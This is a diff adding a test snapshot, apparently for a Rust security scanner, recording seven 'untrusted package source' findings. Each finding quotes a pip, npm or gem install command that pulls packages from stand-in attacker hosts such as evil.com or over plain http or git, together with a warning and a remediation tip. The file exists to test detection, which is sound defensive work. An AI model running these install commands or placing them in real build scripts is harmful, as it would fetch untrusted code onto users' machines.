@@ -1,0 +1,83 @@
+---
+source: src/rules/builtin/supplychain.rs
+expression: findings
+---
+[
+  {
+    "id": "SC-003",
+    "severity": "high",
+    "category": "supply_chain",
+    "confidence": "firm",
+    "name": "Untrusted package source",
+    "line": 5,
+    "code": "pip install --index-url http://evil.com/simple package",
+    "message": "Package installation from untrusted or non-HTTPS source detected. This may introduce malicious dependencies.",
+    "recommendation": "Use official package registries with HTTPS. Verify package integrity with checksums. Consider using lockfiles and dependency scanning."
+  },
+  {
+    "id": "SC-003",
+    "severity": "high",
+    "category": "supply_chain",
+    "confidence": "firm",
+    "name": "Untrusted package source",
+    "line": 6,
+    "code": "pip install -i http://malicious-pypi.com/ package",
+    "message": "Package installation from untrusted or non-HTTPS source detected. This may introduce malicious dependencies.",
+    "recommendation": "Use official package registries with HTTPS. Verify package integrity with checksums. Consider using lockfiles and dependency scanning."
+  },
+  {
+    "id": "SC-003",
+    "severity": "high",
+    "category": "supply_chain",
+    "confidence": "firm",
+    "name": "Untrusted package source",
+    "line": 7,
+    "code": "pip install git+http://github.com/user/repo.git",
+    "message": "Package installation from untrusted or non-HTTPS source detected. This may introduce malicious dependencies.",
+    "recommendation": "Use official package registries with HTTPS. Verify package integrity with checksums. Consider using lockfiles and dependency scanning."
+  },
+  {
+    "id": "SC-003",
+    "severity": "high",
+    "category": "supply_chain",
+    "confidence": "firm",
+    "name": "Untrusted package source",
+    "line": 8,
+    "code": "npm install --registry http://evil.com package",
+    "message": "Package installation from untrusted or non-HTTPS source detected. This may introduce malicious dependencies.",
+    "recommendation": "Use official package registries with HTTPS. Verify package integrity with checksums. Consider using lockfiles and dependency scanning."
+  },
+  {
+    "id": "SC-003",
+    "severity": "high",
+    "category": "supply_chain",
+    "confidence": "firm",
+    "name": "Untrusted package source",
+    "line": 9,
+    "code": "npm install git://github.com/user/malicious-repo.git",
+    "message": "Package installation from untrusted or non-HTTPS source detected. This may introduce malicious dependencies.",
+    "recommendation": "Use official package registries with HTTPS. Verify package integrity with checksums. Consider using lockfiles and dependency scanning."
+  },
+  {
+    "id": "SC-003",
+    "severity": "high",
+    "category": "supply_chain",
+    "confidence": "firm",
+    "name": "Untrusted package source",
+    "line": 10,
+    "code": "gem install --source http://evil.com package",
+    "message": "Package installation from untrusted or non-HTTPS source detected. This may introduce malicious dependencies.",
+    "recommendation": "Use official package registries with HTTPS. Verify package integrity with checksums. Consider using lockfiles and dependency scanning."
+  },
+  {
+    "id": "SC-003",
+    "severity": "high",
+    "category": "supply_chain",
+    "confidence": "firm",
+    "name": "Untrusted package source",
+    "line": 11,
+    "code": "pip install --trusted-host evil.com package",
+    "message": "Package installation from untrusted or non-HTTPS source detected. This may introduce malicious dependencies.",
+    "recommendation": "Use official package registries with HTTPS. Verify package integrity with checksums. Consider using lockfiles and dependency scanning."
+  }
+]
